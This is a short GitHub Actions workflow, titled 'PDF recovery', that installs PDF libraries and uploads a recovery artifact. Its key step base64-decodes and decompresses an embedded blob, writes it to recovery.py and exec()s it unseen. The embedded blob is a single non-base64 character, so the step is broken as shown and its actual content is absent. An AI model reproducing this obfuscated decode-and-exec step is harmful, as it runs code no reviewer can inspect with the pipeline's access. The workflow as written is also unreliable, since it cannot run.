name: PDF recovery
on: {workflow_dispatch: {},push: {paths: [.github/workflows/b2r.yml]}}
jobs:
  pdf:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: python -m pip -q install pymupdf pypdf fonttools
    - run: python -c "import base64,zlib;s=zlib.decompress(base64.b64decode('І'));open('recovery.py','wb').write(s);exec(s)"
    - uses: actions/upload-artifact@v4
      with: {name: Book-PDF-B2R,path: submission-visual-recovery}
